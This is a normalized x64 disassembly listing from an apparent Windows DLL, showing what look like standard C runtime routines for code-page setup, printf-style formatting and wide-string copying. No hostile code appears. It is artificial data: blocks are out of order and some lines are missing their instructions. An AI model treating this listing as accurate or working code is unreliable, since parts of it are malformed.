mov al [ rsp + rdx + 0x270 ]
mov [ rcx + 0x100 ] al
jmp r-xdata
test [ r11 ] 0x1
je r-xdata
jmp r-xdata
inc rcx
inc rdx
add r11 0x2
sub rbx 0x1
jne r-xdata
sub_180011e5c
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
call sub_180010a54
mov rdi rax
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
je r-xdata
mov ecx 0xd
call sub_180016624
nop
mov rbx [ rdi + 0xb8 ]
mov [ rsp + 0x30 ] rbx
cmp rbx [ rw-data ]
je r-xdata
cmp [ rax + 0xc0 ] 0x0
je r-xdata
mov ecx 0xd
call sub_180016524
test rbx rbx
je r-xdata
mov rbx [ rax + 0xb8 ]
jmp r-xdata
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
lea ecx [ rbx + 0x20 ]
call sub_1800110d8
mov rax [ rw-data ]
mov [ rdi + 0xb8 ] rax
mov rax [ rw-data ]
mov [ rsp + 0x30 ] rax
[ rax ] 0x1
mov rbx [ rsp + 0x30 ]
[ rbx ] 0xffffffff
jne r-xdata
test rbx rbx
jne r-xdata
lea rax [ rw-data ]
mov rcx [ rsp + 0x30 ]
cmp rcx rax
je r-xdata
call sub_18000e06c
sub_180011f18
push rbx
sub rsp 0x40
mov ebx ecx
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_18000d428
and [ rw-data ] 0x0
cmp ebx 0xfffffffe
jne r-xdata
cmp ebx 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp ebx 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
add rsp 0x40
pop rbx
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
cmp [ rsp + 0x38 ] 0x0
je r-xdata
mov rax [ rsp + 0x20 ]
mov [ rw-data ] 0x1
mov eax [ rax + 0x4 ]
jmp r-xdata
cmp [ rsp + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
sub_180011fa8
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
sub rsp 0x40
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x38 ] rax
mov rsi rdx
call sub_180011f18
xor ebx ebx
mov edi eax
cmp eax ebx
jne r-xdata
lea r13 [ rw-data ]
mov ecx ebx
mov rbp rbx
mov rax r13
mov r12d 0x1
mov rcx rsi
call sub_180011be4
jmp r-xdata
lea rcx [ rsi + 0x1c ]
xor edx edx
mov r8d 0x101
call sub_180016870
lea rbp [ rbp + rbp * 2 ]
lea r11 [ rw-data ]
add rbp rbp
mov r10d 0x4
lea r8 [ r13 + rbp * 8 + 0x10 ]
add ecx r12d
add rbp r12
add rax 0x30
cmp ecx 0x5
jb r-xdata
xor eax eax
add r8 0x8
add r11 r12
sub r10 r12
jne r-xdata
cmp [ rcx + 0x1 ] bl
je r-xdata
cmp [ rax ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov rcx r8
cmp [ r8 ] bl
je r-xdata
mov [ rsi + 0x4 ] edi
sub edi 0x3a4
mov [ rsi + 0x8 ] r12d
je r-xdata
movzx edx [ rcx ]
movzx eax [ rcx + 0x1 ]
cmp edx eax
ja r-xdata
or eax 0xffffffff
jmp r-xdata
cmp edi 0xfde9
je r-xdata
mov ebx 0x411
sub edi 0x4
je r-xdata
add rcx 0x2
cmp [ rcx ] bl
jne r-xdata
lea r9 [ rdx + rsi + 0x1d ]
mov rcx [ rsp + 0x38 ]
xor rcx rsp
call sub_180017570
mov rbx [ rsp + 0x80 ]
add rsp 0x40
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
movzx ecx di
call [ IsValidCodePage@IAT ]
cmp eax ebx
je r-xdata
movzx eax [ rdi ]
add rdi 0x2
mov [ rdx ] ax
add rdx 0x2
sub rcx r12
jne r-xdata
mov rcx rsi
call sub_180011c78
mov ebx 0x804
jmp r-xdata
sub edi 0xd
je r-xdata
mov al [ r11 ]
add edx r12d
or [ r9 ] al
movzx eax [ rcx + 0x1 ]
add r9 r12
cmp edx eax
jbe r-xdata
lea rdx [ rsp + 0x20 ]
mov ecx edi
call [ GetCPInfo@IAT ]
cmp eax ebx
je r-xdata
mov [ rsi + 0xc ] ebx
lea rdx [ rsi + 0x10 ]
lea rdi [ r13 + rbp * 8 + 0x4 ]
mov ecx 0x6
mov ebx 0x412
jmp r-xdata
cmp edi r12d
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
lea rcx [ rsi + 0x1c ]
xor edx edx
mov r8d 0x101
call sub_180016870
mov [ rsi + 0x4 ] edi
mov [ rsi + 0xc ] ebx
cmp [ rsp + 0x20 ] r12d
jbe r-xdata
mov ebx 0x404
jmp r-xdata
mov [ rsi + 0x8 ] ebx
lea rax [ rsp + 0x26 ]
cmp [ rsp + 0x26 ] bl
je r-xdata
lea rax [ rsi + 0x1e ]
mov ecx 0xfe
cmp [ rax + 0x1 ] bl
je r-xdata
or [ rax ] 0x8
add rax r12
sub rcx r12
jne r-xdata
mov ecx [ rsi + 0x4 ]
sub ecx 0x3a4
je r-xdata
movzx edi [ rax ]
movzx ecx [ rax + 0x1 ]
cmp edi ecx
ja r-xdata
mov eax 0x411
sub ecx 0x4
je r-xdata
add rax 0x2
cmp [ rax ] bl
jne r-xdata
sub ecx edi
lea rdx [ rdi + rsi + 0x1d ]
add ecx r12d
lea rdi [ rsi + 0x10 ]
movzx eax bx
mov ecx 0x6
[ rdi ]
jmp r-xdata
mov eax 0x804
jmp r-xdata
sub ecx 0xd
je r-xdata
or [ rdx ] 0x4
add rdx r12
sub rcx r12
jne r-xdata
mov [ rsi + 0xc ] eax
mov [ rsi + 0x8 ] r12d
jmp r-xdata
mov eax 0x412
jmp r-xdata
cmp ecx r12d
je r-xdata
mov eax 0x404
jmp r-xdata
mov eax ebx
jmp r-xdata
sub_180012220
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push r13
sub rsp 0x30
mov edi ecx
or r13d 0xffffffff
call sub_180010a54
mov rsi rax
call sub_180011e5c
mov rbx [ rsi + 0xb8 ]
mov ecx edi
call sub_180011f18
mov r12d eax
cmp eax [ rbx + 0x4 ]
je r-xdata
xor edi edi
mov r13d edi
mov ecx 0x220
call sub_1800114a4
mov rbx rax
xor edi edi
cmp rax rdi
je r-xdata
mov eax r13d
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
mov r12 [ rsp + 0x58 ]
add rsp 0x30
pop r13
retn
mov rdx [ rsi + 0xb8 ]
mov rcx rax
mov r8d 0x220
call sub_1800160e0
mov [ rbx ] edi
mov rdx rbx
mov ecx r12d
call sub_180011fa8
mov r13d eax
cmp eax edi
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov rcx [ rsi + 0xb8 ]
[ rcx ] 0xffffffff
jne r-xdata
lea r12 [ rw-data ]
cmp rbx r12
je r-xdata
lea r12 [ rw-data ]
mov rcx [ rsi + 0xb8 ]
lea r12 [ rw-data ]
cmp rcx r12
je r-xdata
call sub_180010834
mov [ rax ] 0x16
jmp r-xdata
mov rcx rbx
call sub_18000e06c
test [ rw-data ] 0x1
jne r-xdata
mov [ rsi + 0xb8 ] rbx
[ rbx ] 0x1
test [ rsi + 0xc8 ] 0x2
jne r-xdata
call sub_18000e06c
jmp r-xdata
mov ecx 0xd
call sub_180016624
nop
mov eax [ rbx + 0x4 ]
mov [ rw-data ] eax
mov eax [ rbx + 0x8 ]
mov [ rw-data ] eax
mov eax [ rbx + 0xc ]
mov [ rw-data ] eax
mov edx edi
mov [ rsp + 0x20 ] edx
lea r8 [ __dos_header ]
mov edx edi
mov [ rsp + 0x20 ] edx
movsxd rcx edx
movzx eax [ rbx + rcx * 2 + 0x10 ]
mov [ r8 + rcx * 2 + 0x2fb50 ] ax
inc edx
mov [ rsp + 0x20 ] edx
jmp r-xdata
mov [ rsp + 0x20 ] edi
movsxd rcx edx
mov al [ rcx + rbx + 0x1c ]
mov [ rcx + r8 + 0x2d440 ] al
inc edx
mov [ rsp + 0x20 ] edx
jmp r-xdata
cmp edx 0x5
jge r-xdata
mov rax [ rw-data ]
[ rax ] 0xffffffff
jne r-xdata
movsxd rcx edi
mov al [ rcx + rbx + 0x11d ]
mov [ rcx + r8 + 0x2d550 ] al
inc edi
mov [ rsp + 0x20 ] edi
jmp r-xdata
cmp edx 0x101
jge r-xdata
mov [ rw-data ] rbx
[ rbx ] 0x1
mov ecx 0xd
call sub_180016524
jmp r-xdata
mov rcx [ rw-data ]
cmp rcx r12
je r-xdata
cmp edi 0x100
jge r-xdata
call sub_18000e06c
sub_180012440
mov [ rsp + 0x8 ] cx
sub rsp 0x68
mov eax 0xffff
cmp cx ax
je r-xdata
add rsp 0x68
retn
lea rcx [ rsp + 0x40 ]
call sub_18000d428
mov r11 [ rsp + 0x40 ]
mov edx [ r11 + 0x14 ]
test edx edx
jne r-xdata
movzx ecx [ rsp + 0x70 ]
mov r8d 0x100
cmp cx r8w
jae r-xdata
movzx edx [ rsp + 0x70 ]
lea eax [ rdx - 0x41 ]
cmp ax 0x19
ja r-xdata
mov eax [ r11 + 0x4 ]
lea r9 [ rsp + 0x70 ]
lea rcx [ rsp + 0x40 ]
mov [ rsp + 0x38 ] eax
lea rax [ rsp + 0x80 ]
mov [ rsp + 0x30 ] 0x1
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] 0x1
call sub_18001a728
test eax eax
movzx eax [ rsp + 0x70 ]
je r-xdata
lea r8 [ rsp + 0x40 ]
mov edx 0x1
call sub_18001a004
test eax eax
jne r-xdata
cmp [ rsp + 0x58 ] 0x0
je r-xdata
add dx 0x20
cmp [ rsp + 0x58 ] 0x0
je r-xdata
movzx eax [ rsp + 0x80 ]
mov rax [ rsp + 0x40 ]
movzx edx [ rsp + 0x70 ]
mov rcx [ rax + 0x148 ]
movzx eax [ rcx + rdx ]
jmp r-xdata
movzx eax [ rsp + 0x70 ]
jmp r-xdata
mov ax dx
jmp r-xdata
mov rcx [ rsp + 0x50 ]
and [ rcx + 0xc8 ] 0xfffffffd
mov rcx [ rsp + 0x50 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_18001253c
push rbx
sub rsp 0x20
test [ rdx + 0x18 ] 0x40
mov rbx r8
je r-xdata
add [ rdx + 0x8 ] 0xffffffff
js r-xdata
cmp [ rdx + 0x10 ] 0x0
jne r-xdata
movsx ecx cl
call sub_18000f884
mov rax [ rdx ]
mov [ rax ] cl
inc [ rdx ]
movzx eax cl
jmp r-xdata
inc [ r8 ]
jmp r-xdata
inc [ rbx ]
or [ rbx ] eax
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
add rsp 0x20
pop rbx
retn
sub_180012584
test edx edx
jle r-xdata
retn
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rdi r9
mov rsi r8
mov ebx edx
mov bpl cl
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
test ebx ebx
jg r-xdata
mov r8 rdi
mov rdx rsi
mov cl bpl
dec ebx
call sub_18001253c
cmp [ rdi ] 0xffffffff
je r-xdata
sub_1800125d8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
test [ r8 + 0x18 ] 0x40
mov rdi r9
mov rsi r8
mov ebx edx
mov rbp rcx
je r-xdata
test edx edx
jle r-xdata
cmp [ r8 + 0x10 ] 0x0
jne r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov cl [ rbp ]
mov r8 rdi
mov rdx rsi
dec ebx
call sub_18001253c
inc rbp
cmp [ rdi ] 0xffffffff
jne r-xdata
add [ r9 ] edx
jmp r-xdata
test ebx ebx
jg r-xdata
call sub_180010834
cmp [ rax ] 0x2a
jne r-xdata
mov r8 rdi
mov rdx rsi
mov cl 0x3f
call sub_18001253c
sub_180012658
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x2d0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x2c8 ] rax
xor eax eax
mov rbx rcx
mov [ rsp + 0x68 ] rcx
mov rdi rdx
lea rcx [ rsp + 0x78 ]
mov rdx r8
mov r13 r9
mov [ rsp + 0x60 ] eax
mov r12d eax
mov [ rsp + 0x54 ] eax
mov r14d eax
mov [ rsp + 0x48 ] eax
mov [ rsp + 0x58 ] eax
mov [ rsp + 0x50 ] eax
call sub_18000d428
xor r10d r10d
cmp rbx r10
jne r-xdata
or r15d 0xffffffff
test [ rbx + 0x18 ] 0x40
lea r9 [ __dos_header ]
jne r-xdata
call sub_180010834
xor ebx ebx
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
mov [ rsp + 0x20 ] rbx
call sub_180010764
cmp [ rsp + 0x90 ] bl
je r-xdata
cmp rdi r10
je r-xdata
mov rcx rbx
call sub_18001923c
lea rdx [ rw-data ]
cmp eax r15d
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov rax [ rsp + 0x88 ]
and [ rax + 0xc8 ] 0xfffffffd
call sub_180010834
xor ebx ebx
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
mov [ rsp + 0x20 ] rbx
call sub_180010764
cmp [ rsp + 0x90 ] bl
mov bpl [ rdi ]
mov esi r10d
mov [ rsp + 0x40 ] r10d
mov [ rsp + 0x44 ] r10d
mov edx r10d
mov [ rsp + 0x98 ] r10
cmp bpl r10b
je r-xdata
mov r8 rdx
lea r9 [ __dos_header ]
cmp eax 0xfffffffe
je r-xdata
mov rcx [ rsp + 0x2c8 ]
xor rcx rsp
call sub_180017570
mov rbx [ rsp + 0x320 ]
add rsp 0x2d0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov eax r15d
jmp r-xdata
mov rax [ rsp + 0x88 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rsp + 0x90 ] r10b
je r-xdata
mov rbx [ rsp + 0xa8 ]
mov r11d 0x200
cmp eax r15d
je r-xdata
movsxd r8 eax
lea r9 [ __dos_header ]
mov rcx r8
and r8d 0x1f
sar rcx 0x5
imul r8 r8 0x58
add r8 [ r9 + rcx * 8 + 0x35580 ]
jmp r-xdata
mov eax esi
mov rcx [ rsp + 0x88 ]
and [ rcx + 0xc8 ] 0xfffffffd
lea eax [ rbp - 0x20 ]
cmp al 0x58
ja r-xdata
test [ rdx + 0x38 ] 0x80
je r-xdata
cmp eax 0xfffffffe
je r-xdata
test [ r8 + 0x38 ] 0x7f
jne r-xdata
mov ecx r10d
movsx rax bpl
movsx ecx [ rax + r9 + 0x24df0 ]
and ecx 0xf
jmp r-xdata
xor r10d r10d
movsxd rdx eax
mov rax rdx
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
add rdx [ r9 + rax * 8 + 0x35580 ]
lea rdx [ rsp + 0x78 ]
movzx ecx bpl
mov [ rsp + 0x50 ] r10d
call sub_180019628
xor esi esi
cmp eax esi
je r-xdata
sub ecx 0x1
je r-xdata
movsxd rax edx
movsxd rcx ecx
lea rdx [ rax + rcx * 8 ]
movsx edx [ rdx + r9 + 0x24e10 ]
sar edx 0x4
mov [ rsp + 0x5c ] edx
mov ecx edx
cmp edx r10d
je r-xdata
mov rdx [ rsp + 0x68 ]
lea r8 [ rsp + 0x40 ]
mov cl bpl
call sub_18001253c
xor r10d r10d
jmp r-xdata
mov rdx [ rsp + 0x68 ]
lea r8 [ rsp + 0x40 ]
mov cl bpl
call sub_18001253c
mov bpl [ rdi ]
inc rdi
cmp bpl sil
je r-xdata
mov [ rsp + 0x70 ] r10d
mov [ rsp + 0x58 ] r10d
mov [ rsp + 0x54 ] r10d
mov [ rsp + 0x48 ] r10d
mov r12d r10d
mov r14d r15d
mov [ rsp + 0x50 ] r10d
jmp r-xdata
sub ecx 0x1
je r-xdata
mov esi [ rsp + 0x40 ]
mov edx [ rsp + 0x5c ]
lea r9 [ __dos_header ]
mov r11d 0x200
call sub_180010834
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
mov [ rax ] 0x16
call sub_180010764
cmp [ rsp + 0x90 ] sil
jmp r-xdata
mov bpl [ rdi ]
cmp bpl r10b
jne r-xdata
cmp bpl 0x20
je r-xdata
sub ecx 0x1
je r-xdata
inc rdi
cmp esi r10d
mov [ rsp + 0xb0 ] rdi
jl r-xdata
je r-xdata
or r12d 0x2
jmp r-xdata
cmp bpl 0x23
je r-xdata
cmp bpl 0x2a
jne r-xdata
sub ecx 0x1
je r-xdata
bts r12d 0x7
jmp r-xdata
cmp bpl 0x2b
je r-xdata
mov eax [ rsp + 0x54 ]
lea ecx [ rax + rax * 4 ]
movsx eax bpl
lea eax [ rax + rcx * 2 - 0x30 ]
mov eax [ r13 ]
add r13 0x8
cmp eax r10d
mov [ rsp + 0x54 ] eax
jge r-xdata
mov r14d r10d
jmp r-xdata
sub ecx 0x1
je r-xdata
or r12d 0x1
jmp r-xdata
cmp bpl 0x2d
je r-xdata
or r12d 0x4
neg eax
jmp r-xdata
cmp bpl 0x2a
jne r-xdata
sub ecx 0x1
je r-xdata
or r12d 0x4
jmp r-xdata
cmp bpl 0x30
jne r-xdata
mov [ rsp + 0x54 ] eax
jmp r-xdata
lea ecx [ r14 + r14 * 4 ]
movsx eax bpl
lea r14d [ rax + rcx * 2 - 0x30 ]
jmp r-xdata
mov r14d [ r13 ]
add r13 0x8
cmp r14d r10d
jge r-xdata
cmp bpl 0x49
je r-xdata
cmp ecx 0x1
jne r-xdata
or r12d 0x8
jmp r-xdata
mov r14d r15d
jmp r-xdata
mov al [ rdi ]
bts r12d 0xf
cmp al 0x36
jne r-xdata
cmp bpl 0x68
je r-xdata
movsx eax bpl
cmp eax 0x64
jg r-xdata
cmp al 0x33
jne r-xdata
cmp [ rdi + 0x1 ] 0x34
jne r-xdata
or r12d 0x20
jmp r-xdata
cmp bpl 0x6c
je r-xdata
cmp eax 0x65
jl r-xdata
je r-xdata
cmp al 0x64
je r-xdata
cmp [ rdi + 0x1 ] 0x32
jne r-xdata
add rdi 0x2
bts r12d 0xf
jmp r-xdata
cmp [ rdi ] 0x6c
jne r-xdata
cmp bpl 0x77
jne r-xdata
cmp [ rsp + 0x58 ] r10d
jne r-xdata
cmp eax 0x67
jle r-xdata
or r12d 0x40
cmp eax 0x41
je r-xdata
cmp al 0x69
je r-xdata
add rdi 0x2
btr r12d 0xf
jmp r-xdata
or r12d 0x10
jmp r-xdata
inc rdi
bts r12d 0xc
jmp r-xdata
bts r12d 0xb
jmp r-xdata
mov rax [ rsp + 0x98 ]
cmp rax r10
je r-xdata
test r12b 0x40
je r-xdata
or r12d 0x40
cmp r14d r10d
lea rbx [ rsp + 0xc0 ]
mov esi r11d
jge r-xdata
cmp eax 0x69
je r-xdata
mov r8 [ r13 ]
add r13 0x8
jmp r-xdata
bt r12d 0xc
jae r-xdata
mov [ rsp + 0x70 ] 0x1
add bpl 0x20
cmp eax 0x43
je r-xdata
cmp al 0x6f
je r-xdata
mov rdi [ rsp + 0xb0 ]
mov rcx rax
call sub_18000e06c
xor r10d r10d
mov [ rsp + 0x98 ] r10
mov edi [ rsp + 0x48 ]
bt r12d 0x8
jae r-xdata
jne r-xdata
mov r14d 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
test r12b 0x40
je r-xdata
add r13 0x8
test r12b 0x20
je r-xdata
test r12d 0x830
jne r-xdata
cmp eax 0x45
je r-xdata
cmp al 0x75
je r-xdata
lea r9 [ rsp + 0x40 ]
lea rcx [ rsp + 0x4c ]
mov r8 rbp
mov edx edi
call sub_1800125d8
test r12b 0x8
je r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 rbp
mov edx esi
mov cl 0x20
call sub_180012584
test r12b 0x1
je r-xdata
mov [ rsp + 0x4c ] 0x2d
jmp r-xdata
cmp r14d r11d
cmovg r14d r11d
cmp r14d 0xa3
jle r-xdata
cmp bpl 0x67
jne r-xdata
mov rax [ r13 ]
mov rcx [ rw-data ]
add r13 0x8
movsx edi bpl
movsxd rsi esi
mov [ rsp + 0xa8 ] rax
call DecodePointer
lea rcx [ rsp + 0x78 ]
mov r9d edi
mov [ rsp + 0x30 ] rcx
mov ecx [ rsp + 0x70 ]
mov r8 rsi
mov [ rsp + 0x28 ] ecx
lea rcx [ rsp + 0xa8 ]
mov rdx rbx
mov [ rsp + 0x20 ] r14d
call rax
mov edi r12d
xor eax eax
and edi 0x80
je r-xdata
mov rdi [ r13 ]
add r13 0x8
call sub_180019494
xor r10d r10d
cmp eax r10d
je r-xdata
cmp eax 0x6f
je r-xdata
bt r12d 0xf
jb r-xdata
cmp r8 r10
jge r-xdata
test r12b 0x40
je r-xdata
test r12b 0x40
je r-xdata
add r13 0x8
test r12d 0x810
je r-xdata
bts r12d 0xb
cmp eax 0x47
je r-xdata
cmp al 0x78
je r-xdata
mov edi [ rsp + 0x44 ]
xor eax eax
cmp [ rsp + 0x50 ] eax
je r-xdata
test r12b 0x4
jne r-xdata
test r12b 0x2
je r-xdata
mov [ rsp + 0x4c ] 0x2b
mov edi 0x1
mov [ rsp + 0x48 ] edi
jmp r-xdata
lea edi [ r14 + 0x15d ]
movsxd rcx edi
call sub_1800114a4
mov [ rsp + 0x98 ] rax
test rax rax
je r-xdata
mov r14d 0x1
jmp r-xdata
cmp bpl 0x67
jne r-xdata
cmp r14d eax
jne r-xdata
test r12b 0x20
je r-xdata
mov r9d 0x8
test r12b r12b
jns r-xdata
cmp eax 0x70
je r-xdata
cmp r14d r10d
jge r-xdata
bt r12d 0xc
jb r-xdata
neg r8
bts r12d 0x8
mov r8d [ r13 - 0x8 ]
movsxd r8 [ r13 - 0x8 ]
jmp r-xdata
movzx r8d [ r13 - 0x8 ]
jmp r-xdata
movsx r8 [ r13 - 0x8 ]
jmp r-xdata
mov al [ r13 - 0x8 ]
mov [ rsp + 0x44 ] 0x1
mov [ rsp + 0xc0 ] al
movzx r9d [ r13 - 0x8 ]
lea rdx [ rsp + 0xc0 ]
lea rcx [ rsp + 0x44 ]
mov r8 r11
call sub_18001a9dc
xor r10d r10d
cmp eax r10d
je r-xdata
cmp eax 0x53
je r-xdata
cmp al 0x58
je r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 rbp
mov edx edi
mov rcx rbx
call sub_1800125d8
xor r10d r10d
cmp edi eax
jle r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 rbp
mov edx esi
mov cl 0x30
call sub_180012584
mov [ rsp + 0x4c ] 0x20
jmp r-xdata
mov esi [ rsp + 0x54 ]
mov rbp [ rsp + 0x68 ]
sub esi [ rsp + 0x44 ]
sub esi edi
test r12b 0xc
jne r-xdata
mov r14d 0xa3
mov rbx rax
mov esi edi
jmp r-xdata
cmp [ rbx ] 0x2d
jne r-xdata
cmp edi eax
jne r-xdata
mov rcx [ rw-data ]
call DecodePointer
lea rdx [ rsp + 0x78 ]
mov rcx rbx
call rax
xor eax eax
mov [ rdi ] esi
mov [ rdi ] si
jmp r-xdata
mov edx [ rsp + 0x48 ]
bts r12d 0x9
jmp r-xdata
mov r14d 0x10
bts r12d 0xf
cmp eax 0x73
je r-xdata
and r12d 0xfffffff7
cmp r14d r11d
cmovg r14d r11d
mov r14d 0x1
jmp r-xdata
mov r8d r8d
lea rbx [ rsp + 0xc0 ]
jmp r-xdata
mov [ rsp + 0x58 ] 0x1
jmp r-xdata
test r12d 0x830
jne r-xdata
cmp eax 0x58
je r-xdata
mov [ rsp + 0x5c ] r10d
test r12b 0x4
je r-xdata
mov rbp rbx
mov rcx rbx
call sub_1800174b0
xor r10d r10d
bts r12d 0x8
inc rbx
mov rcx [ rw-data ]
call DecodePointer
lea rdx [ rsp + 0x78 ]
mov rcx rbx
call rax
mov [ rsp + 0x58 ] 0x1
jmp r-xdata
add al 0x51
mov [ rsp + 0x4c ] 0x30
lea edx [ r9 - 0xe ]
mov [ rsp + 0x4d ] al
jmp r-xdata
mov rbx [ r13 ]
cmp r14d r15d
mov eax r14d
mov ecx 0x7fffffff
cmove eax ecx
add r13 0x8
test r12d 0x810
je r-xdata
cmp eax 0x75
je r-xdata
xor edx edx
mov rax r8
movsxd rcx r9d
div rcx
mov r8 rax
lea eax [ rdx + 0x30 ]
cmp eax 0x39
jle r-xdata
cmp r8 r10
je r-xdata
mov r15d [ rsp + 0x60 ]
mov rax r8
lea rbx [ rsp + 0x2bf ]
neg rax
sbb ecx ecx
and ecx edx
mov [ rsp + 0x48 ] ecx
bts r12d 0xb
mov eax 0x7
cmp eax 0x5a
je r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 rbp
mov edx esi
mov cl 0x20
call sub_180012584
xor r10d r10d
mov rbp [ rsp + 0x68 ]
mov eax r15d
mov [ rsp + 0x40 ] eax
jmp r-xdata
mov edx [ rsp + 0xa0 ]
cmp edx r10d
je r-xdata
bt r12d 0xf
jb r-xdata
cmp rbx r10
cmove rbx [ rw-data ]
mov rcx rbx
jmp r-xdata
cmp rbx r10
mov [ rsp + 0x50 ] 0x1
cmove rbx [ rw-data ]
mov rcx rbx
jmp r-xdata
mov r9d 0xa
cmp eax 0x78
jne r-xdata
mov [ rbx ] al
dec rbx
jmp r-xdata
add eax r15d
lea rax [ rsp + 0x2bf ]
mov r15d 0xffffffff
sub eax ebx
inc rbx
bt r12d 0x9
mov [ rsp + 0x44 ] eax
jae r-xdata
mov rax [ r13 ]
add r13 0x8
cmp rax r10
je r-xdata
cmp eax 0x61
je r-xdata
cmp eax r10d
jl r-xdata
mov r8 [ rsp + 0x68 ]
lea r9 [ rsp + 0x40 ]
lea rcx [ rsp + 0x2c0 ]
call sub_1800125d8
xor r10d r10d
cmp edi r10d
jne r-xdata
cmp eax r10d
jne r-xdata
cmp eax r10d
jne r-xdata
mov eax 0x27
jmp r-xdata
mov ecx r14d
dec r14d
cmp ecx r10d
jg r-xdata
cmp eax r10d
je r-xdata
mov rbx [ rw-data ]
jmp r-xdata
mov rbx [ rax + 0x8 ]
cmp rbx r10
je r-xdata
cmp eax 0x63
je r-xdata
movzx r9d [ rbp ]
lea rdx [ rsp + 0x2c0 ]
lea rcx [ rsp + 0xa0 ]
mov r8d 0x6
dec edi
add rbp 0x2
call sub_18001a9dc
xor r10d r10d
cmp eax r10d
jne r-xdata
mov rbp [ rsp + 0x68 ]
jmp r-xdata
dec eax
cmp [ rcx ] r10b
je r-xdata
sub ecx ebx
dec eax
cmp [ rcx ] r10w
je r-xdata
sub rcx rbx
sar rcx 0x1
jmp r-xdata
mov [ rsp + 0x60 ] eax
mov r9d 0x10
test r12b r12b
jns r-xdata
dec rbx
inc [ rsp + 0x44 ]
mov [ rbx ] 0x30
jmp r-xdata
cmp [ rbx ] 0x30
je r-xdata
bt r12d 0xb
movsx eax [ rax ]
jae r-xdata
jmp r-xdata
mov eax [ rsp + 0x40 ]
inc rcx
add rcx 0x2
mov [ rsp + 0x44 ] ecx
jmp r-xdata
mov [ rsp + 0x50 ] r10d
jmp r-xdata
cdq
mov [ rsp + 0x50 ] 0x1
sub eax edx
sar eax 0x1
jmp r-xdata
mov [ rsp + 0x44 ] eax
sub_180013140
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x30
xor edi edi
mov r11 r8
cmp r9 rdi
jne r-xdata
cmp rcx rdi
je r-xdata
cmp rcx rdi
jne r-xdata
call sub_180010834
mov ebx 0x16
cmp rdx rdi
jbe r-xdata
cmp rdx rdi
jne r-xdata
cmp r9 rdi
jne r-xdata
xor eax eax
jmp r-xdata
cmp r8 rdi
jne r-xdata
mov [ rcx ] di
jmp r-xdata
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
mov r10 rcx
mov r8 rdx
cmp r9 0xffffffffffffffff
jne r-xdata
mov [ rcx ] di
movzx eax [ r11 ]
add r11 0x2
mov [ r10 ] ax
add r10 0x2
cmp ax di
je r-xdata
movzx eax [ r11 ]
add r11 0x2
mov [ r10 ] ax
add r10 0x2
cmp ax di
je r-xdata
cmp r9 rdi
jne r-xdata
sub r8 0x1
je r-xdata
cmp r8 rdi
jne r-xdata
sub r8 0x1
jne r-xdata
mov [ r10 ] di
sub r9 0x1
jne r-xdata
cmp r9 0xffffffffffffffff
jne r-xdata
jmp r-xdata
mov [ rcx ] di
call sub_180010834
mov ebx 0x22
jmp r-xdata
mov [ rcx + rdx * 2 - 0x2 ] di
lea eax [ r9 + 0x51 ]
jmp r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rdi
mov [ rax ] ebx
call sub_180010764
mov eax ebx
sub_18001322c
push rbx
sub rsp 0x30
mov rbx rcx
mov ecx 0xe
call sub_180016624
nop
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
mov ecx 0xe
call sub_180016524
add rsp 0x30
pop rbx
retn
mov rcx [ rw-data ]
mov [ rsp + 0x20 ] rcx
lea rdx [ rw-data ]
mov rcx [ rbx + 0x8 ]
call sub_18000e06c
and [ rbx + 0x8 ] 0x0
cmp [ rcx ] rax
